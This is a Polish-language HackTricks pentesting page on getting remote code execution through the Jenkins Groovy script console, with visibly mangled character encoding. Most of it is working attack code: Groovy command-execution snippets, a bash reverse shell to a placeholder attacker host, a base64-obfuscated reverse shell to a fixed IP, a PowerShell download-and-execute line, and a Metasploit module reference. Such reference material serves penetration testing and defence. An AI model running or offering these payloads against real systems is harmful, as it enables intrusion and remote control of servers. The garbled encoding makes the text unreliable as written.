# Jenkins RCE z uÅ¼yciem skryptu Groovy

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ **reklamÄ™ swojej firmy w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Jenkins RCE z uÅ¼yciem skryptu Groovy

To jest mniej uciÄ…Å¼liwe niÅ¼ tworzenie nowego projektu w Jenkins

1. PrzejdÅº do _path\_jenkins/script_
2. WprowadÅº skrypt w polu tekstowym
```python
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```
MoÅ¼esz wykonaÄ‡ polecenie za pomocÄ…: `cmd.exe /c dir`

W **linuxie** moÅ¼esz uÅ¼yÄ‡: **`"ls /".execute().text`**

JeÅ›li musisz uÅ¼yÄ‡ _cudzysÅ‚owÃ³w_ i _apostrofÃ³w_ wewnÄ…trz tekstu, moÅ¼esz uÅ¼yÄ‡ _"""PAYLOAD"""_ (potrÃ³jne podwÃ³jne cudzysÅ‚owy) do wykonania payloadu.

**Inny przydatny skrypt groovy** to (zamieÅ„ \[WSTAW POLECENIE]):
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### OdwrÃ³cony shell w systemie Linux

A reverse shell is a technique used in penetration testing to gain remote access to a target machine. It involves establishing a connection from the target machine to the attacker's machine, allowing the attacker to execute commands on the target machine.

To create a reverse shell in Linux, you can use the following command:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

Replace `ATTACKER_IP` with the IP address of your machine and `ATTACKER_PORT` with the port number you want to use for the connection.

After executing this command on the target machine, it will establish a connection to your machine, and you will have a shell prompt that allows you to execute commands on the target machine remotely.

Keep in mind that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing with proper authorization.
```python
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
### OdwrÃ³cona powÅ‚oka w systemie Windows

MoÅ¼esz przygotowaÄ‡ serwer HTTP z odwrÃ³conÄ… powÅ‚okÄ… PS i uÅ¼yÄ‡ Jekinsa do pobrania i wykonania jej:
```python
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')"
echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc <BASE64>
```
### Skrypt

MoÅ¼esz zautomatyzowaÄ‡ ten proces za pomocÄ… [**tego skryptu**](https://github.com/gquere/pwn\_jenkins/blob/master/rce/jenkins\_rce\_admin\_script.py).

MoÅ¼esz uÅ¼yÄ‡ MSF do uzyskania odwrÃ³conego powÅ‚oki (reverse shell):
```
msf> use exploit/multi/http/jenkins_script_console
```
<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
